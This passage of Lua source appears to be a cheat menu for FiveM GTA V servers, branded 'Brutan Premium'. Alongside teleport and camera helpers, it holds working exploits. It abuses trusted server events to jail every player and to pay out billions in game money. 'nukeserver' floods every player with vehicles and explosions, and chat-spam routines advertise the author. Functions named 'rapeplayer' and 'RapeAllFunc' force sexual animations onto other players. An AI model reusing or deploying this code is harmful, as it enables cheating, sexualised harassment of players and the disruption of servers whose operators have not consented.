			["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}

	local pickupButton = {
		["label"] = "Delete",
		["button"] = "~INPUT_VEH_DUCK~"
	}
	
	local explodeButton = {
		["label"] = "Explode",
		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
	}

	local buttonsToDraw = {
		{
			["label"] = "Toggle Camera",
			["button"] = "~INPUT_DETONATE~"
		}
	}

	if distanceCheck <= 10000000.0 then
		for buttonIndex = 1, #steeringButtons do
			local steeringButton = steeringButtons[buttonIndex]

			table.insert(buttonsToDraw, steeringButton)
		end

		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, explodeButton)
		end
		
		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, pickupButton)
		end
	end

    Citizen.CreateThread(function()
        local instructionScaleform = RequestScaleformMovie("instructional_buttons")

        while not HasScaleformMovieLoaded(instructionScaleform) do
            Wait(0)
        end

        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
        PushScaleformMovieFunctionParameterBool(0)
        PopScaleformMovieFunctionVoid()

        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
            PushScaleformMovieFunctionParameterString(buttonValues["label"])
            PopScaleformMovieFunctionVoid()
        end

        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        PushScaleformMovieFunctionParameterInt(-1)
        PopScaleformMovieFunctionVoid()
        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
    end)
end

-- 4x482

RCCar.Spawn = function()
	RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 })

	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())

	RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true)

	while not DoesEntityExist(RCCar.Entity) do
		Citizen.Wait(5)
	end

	RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)

	SetEntityInvincible(RCCar.Driver, true)
	SetEntityVisible(RCCar.Driver, false)
	FreezeEntityPosition(RCCar.Driver, true)
	SetPedAlertness(RCCar.Driver, 0.0)
    SetVehicleNumberPlateText(RCCar.Entity, "Brutan#7799")
	TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
   

	while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
		Citizen.Wait(0)
	end

	RCCar.Attach("place")
end

RCCar.Attach = function(param)
	if not DoesEntityExist(RCCar.Entity) then
		return
	end
	
	RCCar.LoadModels({ "pickup_object" })

	if param == "place" then

		PlaceObjectOnGroundProperly(RCCar.Entity)
	elseif param == "pick" then
		if DoesCamExist(RCCar.Camera) then
			RCCar.ToggleCamera(false)
		end

		RCCar.Tablet(false)

		DeleteVehicle(RCCar.Entity)
		DeleteEntity(RCCar.Driver)

		RCCar.UnloadModels()
	end
end

RCCar.Tablet = function(boolean)
	if boolean then



	
		Citizen.CreateThread(function()
			while DoesEntityExist(RCCar.TabletEntity) do
				Citizen.Wait(5)
	

			end

			ClearPedTasks(PlayerPedId())
		end)
	else
		DeleteEntity(RCCar.TabletEntity)
	end
end

ConfigCamera = true

RCCar.ToggleCamera = function(boolean)
	if not ConfigCamera then return end

	if boolean then
		if not DoesEntityExist(RCCar.Entity) then return end 
		if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end

		RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)

		AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, 0.0, 0.4, true)

		Citizen.CreateThread(function()
			while DoesCamExist(RCCar.Camera) do
				Citizen.Wait(5)

				SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
			end
		end)

		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)

		RenderScriptCams(1, 1, easeTime, 1, 1)

		Citizen.Wait(easeTime)

	else
		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)

		RenderScriptCams(0, 1, easeTime, 1, 0)

		Citizen.Wait(easeTime)

		ClearTimecycleModifier()

		DestroyCam(RCCar.Camera)
	end
end

RCCar.LoadModels = function(models)
	for modelIndex = 1, #models do
		local model = models[modelIndex]

		if not RCCar.CachedModels then
			RCCar.CachedModels = {}
		end

		table.insert(RCCar.CachedModels, model)

		if IsModelValid(model) then
			while not HasModelLoaded(model) do
				RequestModel(model)
	
				Citizen.Wait(10)
			end
		else
			while not HasAnimDictLoaded(model) do
				RequestAnimDict(model)
	
				Citizen.Wait(10)
			end    
		end
	end
end

RCCar.UnloadModels = function()
	for modelIndex = 1, #RCCar.CachedModels do
		local model = RCCar.CachedModels[modelIndex]

		if IsModelValid(model) then
			SetModelAsNoLongerNeeded(model)
		else
			RemoveAnimDict(model)   
		end
	end
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP9N", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP9N", "", ExampleText, "", "", "", MaxStringLength)
    blockinput = true

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end

    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return result
    else
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end

function DelVeh(veh)
    SetEntityAsMissionEntity(veh, 1, 1)
    DeleteEntity(veh)
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function TeleportToCoords()
    local x = KeyboardInput("Enter X Pos", "", 100)
    local y = KeyboardInput("Enter Y Pos", "", 100)
    local z = KeyboardInput("Enter Z Pos", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        drawNotification("~r~Invalid Coordinates, are you fucking stupid?")
    end
end

function TeleportToWaypoint()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local blipIterator = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, blipIterator)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
        wp = true



        local zHeigt = 0.0
        height = 1000.0
        while true do
            Citizen.Wait(0)
            if wp then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end

                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
                FreezeEntityPosition(entity, true)
                local Pos = GetEntityCoords(entity, true)

                if zHeigt == 0.0 then
                    height = height - 25.0
                    SetEntityCoords(entity, Pos.x, Pos.y, height)
                    bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
                else
                    SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
                    FreezeEntityPosition(entity, false)
                    wp = false
                    height = 1000.0
                    zHeigt = 0.0
                    drawNotification("~g~Teleported to waypoint!")
                    break
                end
            end
        end
    else
        drawNotification("~r~You have no waypoint?!")
    end
end

function rapeplayer()
    Citizen.CreateThread(
        function()
            RequestModelSync('a_m_o_acult_01')
            RequestAnimDict('rcmpaparazzo_2')
            while not HasAnimDictLoaded('rcmpaparazzo_2') do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh, true, true)
                DeleteVehicle(veh)
                DeleteEntity(veh)
            end
            count = -0.2
            for b = 1, 3 do
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                local bz = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                SetEntityAsMissionEntity(bz, true, true)
                AttachEntityToEntity(
                    bz,
                    GetPlayerPed(SelectedPlayer),
                    4103,
                    11816,
                    count,
                    0.00,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    false,
                    false,
                    false,
                    false,
                    2,
                    true
                )
                ClearPedTasks(GetPlayerPed(SelectedPlayer))
                TaskPlayAnim(
                    GetPlayerPed(SelectedPlayer),
                    'rcmpaparazzo_2',
                    'shag_loop_poppy',
                    2.0,
                    2.5,
                    -1,
                    49,
                    0,
                    0,
                    0,
                    0
                )
                SetPedKeepTask(bz)
                TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(bz, true)
                count = count - 0.4
            end
        end
    )
end

function CreateDeer()
	local Model = GetHashKey("a_c_deer")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Handle, Animal.Ragdoll)
	SetEntityInvincible(Handle, Animal.Invincible)
    SetPedDefaultComponentVariation(Handle)
	SetModelAsNoLongerNeeded(Model)
end

function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"You just got fucked mate")
    end
    Citizen.CreateThread(function()
        for i=0,128 do
            RequestModelSync("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2")do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(i),true)then
                local veh=GetVehiclePedIsIn(GetPlayerPed(i),true)
                while not NetworkHasControlOfEntity(veh)do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh,true,true)
                DeleteVehicle(veh)DeleteEntity(veh)end
                count=-0.2
                for b=1,3 do
                    local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),true))
                    local bD=CreatePed(4,GetHashKey("a_m_o_acult_01"),x,y,z,0.0,true,false)
                    SetEntityAsMissionEntity(bD,true,true)
                    AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)
                    ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
                    SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
                    SetEntityInvincible(bD,true)count=count-0.4
            end
        end
    end)
end

function teleportToNearestVehicle()
            local playerPed = GetPlayerPed(-1)
            local playerPedPos = GetEntityCoords(playerPed, true)
            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
            local NearestPlanePos = GetEntityCoords(NearestPlane, true)
        drawNotification("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
            drawNotification("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
            if IsVehicleSeatFree(NearestPlane, -1) then
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, false)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, false)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, false)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
                end
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestPlane, -1) then
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                else
                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, false)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
                end
            end
            drawNotification("~g~Teleported Into Nearest Vehicle!")
        end

    end



	local function d(e)
    local f = {}
    local h = GetGameTimer() / 200
    f.r = math.floor(math.sin(h * e + 0) * 127 + 128)
    f.g = math.floor(math.sin(h * e + 2) * 127 + 128)
    f.b = math.floor(math.sin(h * e + 4) * 127 + 128)
    return f
end
	
local cL = true
local cM = false
local cN = true
local cO = true
Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for f = 0, 128 do
                if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                   local ped = GetPlayerPed(f)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(f), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(f)
                    if cM then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cL then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, f)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, f)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, f)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)

function ShootPlayer(player)
    local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end


function SpawnObjOnPlayer(modelHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
    local obj CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
        if attachProp then
            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
        end
end

function nukeserver()
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"

        while not HasModelLoaded(GetHashKey(dh))do
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end

        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end

        while not HasModelLoaded(GetHashKey(dg))do
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end

        while not HasModelLoaded(GetHashKey(dj))do
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end

        while not HasModelLoaded(GetHashKey(dk))do
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end

        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Brutan Premium")
        end

        for i=0,128 do
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
     end)
    end

function rotDirection(rot)
    local radianz = rot.z * 0.0174532924
    local radianx = rot.x * 0.0174532924
    local num = math.abs(math.cos(radianx))

    local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))

    return dir
end

function GetDistance(pointA, pointB)

    local aX = pointA.x
    local aY = pointA.y
    local aZ = pointA.z

    local bX = pointB.x
    local bY = pointB.y
    local bZ = pointB.z

    local xBA = bX - aX
    local yBA = bY - aY
    local zBA = bZ - aZ

    local y2 = yBA * yBA
    local x2 =  xBA * xBA
    local sum2 = y2 + x2

    return math.sqrt(sum2 + zBA)
end

function getPosition()
  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
  return x,y,z
end

function getCamDirection()
  local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
  local pitch = GetGameplayCamRelativePitch()

  local x = -math.sin(heading*math.pi/180.0)
  local y = math.cos(heading*math.pi/180.0)
  local z = math.sin(pitch*math.pi/180.0)

  local len = math.sqrt(x*x+y*y+z*z)
  if len ~= 0 then
    x = x/len
    y = y/len
    z = z/len
  end

  return x,y,z
end

function RotToDirection(rot)
    local radiansZ = rot.z * 0.0174532924
    local radiansX = rot.x * 0.0174532924
    local num = math.abs(math.cos(radiansX))
    local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
    return dir
end

function add(a, b)
    local result = vector3(a.x + b.x, a.y + b.y, a.z + b.z)

    return result
end

function multiply(coords, coordz)
    local result = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)

    return result
end

function SpectatePlayer(player)
    local playerPed = PlayerPedId()
    Spectating = not Spectating
    local targetPed = GetPlayerPed(player)

    if (Spectating) then
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(true, targetPed)

        drawNotification("~r~Spectating " .. GetPlayerName(player))
    else
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(false, targetPed)

        drawNotification("~r~Stopped Spectating " .. GetPlayerName(player))
    end
end

Citizen.CreateThread(
    function()
        while true do
            Citizen.Wait(0)

            DisplayRadar(true)

            SetPlayerWantedLevel(PlayerId(), 0, false)

            SetPlayerWeaponDamageModifier(PlayerId(), selectedDamage)
            SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedDamage)

            if infStamina then
                RestorePlayerStamina(PlayerId(), 1.0)
            end
			
			if chatspam then
                TriggerServerEvent(
                    '_chat:messageEntered',
                    'Brutan#7799',
                    {0, 0x99, 255},
                    '/ooc Brutan Premium BRUTAN ON YOUTUBE'
                )
                TriggerServerEvent('_chat:messageEntered', '^8Brutan Premium', {0, 0x99, 255}, '^3 Brutan Premium BRUTAN ON YOUTUBE')
				else
				
            end
	
			if banallusers then
				for i = 0, 128 do
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~BRUTAN ON YOUTUBE")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~BRUTAN ON YOUTUBE")
					end
				end

						if esxdestroy then
				for i = 0, 128 do
						TriggerServerEvent("esx_truckerjob:pay", 9999999999)
						TriggerServerEvent("AdminMenu:giveCash", 9999999999)
						TriggerServerEvent("esx_dmvschool:pay",  9999999999)
						TriggerServerEvent("LegacyFuel:PayFuel", 9999999999)
				end
			end
			
            if invisible then
                SetEntityVisible(GetPlayerPed(-1), false, 0)
            else
                SetEntityVisible(GetPlayerPed(-1), true, 0)
            end
			
			
            if freezePlayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end

            if crosshair then
                ShowHudComponentThisFrame(14)
            end
			
			if ci then
                local cK = false
                local cL = 130
                local cM = 0
                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                        local ped = GetPlayerPed(i)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                        if cK then
                            if NetworkIsPlayerTalking(i) then
                                local cN = d(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    cN.r,
                                    cN.g,
                                    cN.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < cL then
                            if not cK then
                                if NetworkIsPlayerTalking(i) then
                                    local cN = d(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
